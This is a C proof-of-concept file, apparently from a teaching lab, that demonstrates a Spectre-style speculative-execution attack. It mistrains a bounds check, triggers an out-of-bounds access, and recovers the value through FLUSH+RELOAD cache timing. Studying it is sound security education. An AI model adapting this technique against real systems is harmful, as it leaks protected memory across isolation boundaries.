#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

int size = 10;
uint8_t array[256*4096];
uint8_t temp = 0;
#define CACHE_HIT_THRESHOLD (103)
#define OFFSET 1024

void flushSideChannel()
{
  for(int i=0; i<10; i++){
    _mm_clflush(&array[i*4096 + OFFSET]);
  } 
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  for(int i=0;i<256;i++){
    addr = &array[i*4096 + OFFSET];
    time1= __rdtscp(&junk); junk= *addr;
    time2= __rdtscp(&junk) - time1;
    if(time2<=CACHE_HIT_THRESHOLD){
      printf("array[%d*4096 + %d] is in the cache\n", i, OFFSET);
      printf("The Secret = %d.\n",i);
    }
  }
}

void victim(size_t x)
{
  if (x < size) {  
  	temp = array[x * 4096 + OFFSET];  
  }
}

int main() {
  int i;
  // FLUSH the probing array
  flushSideChannel();

  for (i = 0; i < 10; i++) {   
   _mm_clflush(&size); 
   victim(i);
  }

  // Exploit the out-of-order execution
  _mm_clflush(&size);
  for (i = 0; i < 256; i++) {
     _mm_clflush(&array[i*4096 + OFFSET]); 
  }
  victim(97);
  
  // RELOAD the probing array
  // Print out the Secret
  reloadSideChannel();
 
  return (0); 
}
